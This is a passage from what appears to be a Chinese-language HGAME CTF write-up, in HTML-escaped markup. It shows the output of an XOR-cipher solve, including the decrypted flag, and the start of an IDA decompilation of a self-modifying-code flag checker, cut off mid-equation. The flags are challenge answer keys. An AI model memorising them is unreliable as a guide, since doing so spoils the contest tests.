style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;~iddle. You&amp;#39;ll sve both sides of3your &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;face are cretty symmetricrl. This is &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;knodn as bilateral `ymmetry and it&amp;#39;` &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;where both siwes either side |f this &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;dividint line appear moae or less the srme.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;So here is ghe flag: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;hgamehX0r_i5-a_uS3fU184nd$fUNny_C1pH3a}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
ubuntu&lt;span style=&#34;color:#a6e22e&#34;&gt;@DESKTOP&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;mnt&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;HGAME&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;cipher&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; python3
Python &lt;span style=&#34;color:#ae81ff&#34;&gt;3.8.5&lt;/span&gt; (default, Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;)
[GCC &lt;span style=&#34;color:#ae81ff&#34;&gt;9.3.0&lt;/span&gt;] on linux
Type &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;copyright&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;credits&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;license&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; more information&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;g&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; chr(&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;)
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;P&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
ubuntu&lt;span style=&#34;color:#a6e22e&#34;&gt;@DESKTOP&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;mnt&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;HGAME&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;cipher&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; python3 solve&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
&lt;span style=&#34;color:#ae81ff&#34;&gt;1069&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Symmetry in art is when the elements of &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a painting or drawing balance each other &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;out. This could be the objects themselves, &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;but it can also relate to colors and &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;other compositional techniques.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;You may not realize it, but your brain &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;is busy working behind the scenes to seek &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;out symmetry when you look at a painting. &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;There are several reasons for this. The &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;first is that we&amp;#39;re hard-wired to look for &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;it. Our ancient ancestors may not have had &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a name for it, but they knew that their &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;own bodies were basically symmetrical, as &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;were those of potential predators or prey. &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Therefore, this came in handy whether &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;choosing a mate, catching dinner or &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;avoiding being on the menu of a snarling, &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;hungry pack of wolves or bears!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Take a look at your face in the mirror &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;and imagine a line straight down the &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;middle. You&amp;#39;ll see both sides of your &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;face are pretty symmetrical. This is &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;known as bilateral symmetry and it&amp;#39;s &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;where both sides either side of this &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;dividing line appear more or less the same.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;So here is the flag: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;hgame{X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;fake&#34;&gt;FAKE&lt;/h2&gt;
&lt;p&gt;第一次做 SMC&lt;/p&gt;
&lt;h3 id=&#34;step-0错误的做法&#34;&gt;step 0：错误的做法&lt;/h3&gt;
&lt;p&gt;拖入ida&lt;/p&gt;
&lt;p&gt;进入主函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; __usercall main&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;a1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;rsi&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;a2&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;rdx&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a3&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;rbp&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v3; &lt;span style=&#34;color:#75715e&#34;&gt;// rdx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v4; &lt;span style=&#34;color:#75715e&#34;&gt;// rdx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v6; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp-D8h] [rbp-D8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; flag; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp-48h] [rbp-48h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;signed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp-Ch] [rbp-Ch]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v9; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp-8h] [rbp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;__asm&lt;/span&gt; { endbr64 }
  v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a3;
  print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Give me your true flag:&amp;#34;&lt;/span&gt;, a1, a2);
  scan(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%50s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;flag);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( length(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;flag) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; )
  {
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wrong length.&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;flag, v3);
    sub_401120();
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;);&lt;span style=&#34;color:#75715e&#34;&gt;// v9 - 64 = flag, flag往前偏移12个字节
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)sub_401216((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v6) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )&lt;span style=&#34;color:#75715e&#34;&gt;// 动态调试结果显示，v6就是输入的flag
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Ohhhhhhhhhh!&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;flag, v4);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wrong flag. Keep looking!&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;flag, v4);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现对于输入的flag，进行一个函数的判断&lt;/p&gt;
&lt;p&gt;进入函数，发现一串如下的代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;132&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;140&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;)
